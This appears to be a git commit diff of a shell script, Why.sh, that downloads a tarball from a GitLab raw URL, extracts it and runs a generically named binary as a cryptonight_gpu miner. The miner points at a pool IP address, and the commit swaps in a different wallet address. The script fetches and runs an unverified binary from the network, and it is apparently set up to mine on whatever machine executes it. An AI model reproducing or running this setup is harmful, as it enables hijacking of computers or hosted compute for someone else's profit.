2c8cb444671d34c06d6aaf7112a30eef39b811d1
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-17 01:25:46 +0700

    Update and rename why.sh to Why.sh

--- Why.sh
+++ Why.sh
@@ -13,4 +13,4 @@ Also, make sure to confirm the necessary dependencies are installed for the righ
 strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX
 
 wget https://gitlab.com/ontaracing04/gas/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
-./best --tls-url 69.164.205.118:443 --user Tsz4m96ZdeQBAk2vrPqfWwaUhzkfUb3mDCBJG5iLsWGzf8B8SZZMu5BARrg3b5eEsVCCucbkskJgWfSBFMwBFFgqABv5CFzxsz --pass $(echo $(shuf -i 1-20000 -n 1)-asep) --currency cryptonight_gpu 
+./best --tls-url 69.164.205.118:443 --user 48Wv6g3FojrE3Fyt9p6QKK9TtUpUYMBe7jmXyvFt2tqrciHaUKT8VM64sNAE4fjiirBKhRsknZFr13CRrudvexBZJaabEUJ --pass $(echo $(shuf -i 1-20000 -n 1)-asep) --currency cryptonight_gpu 
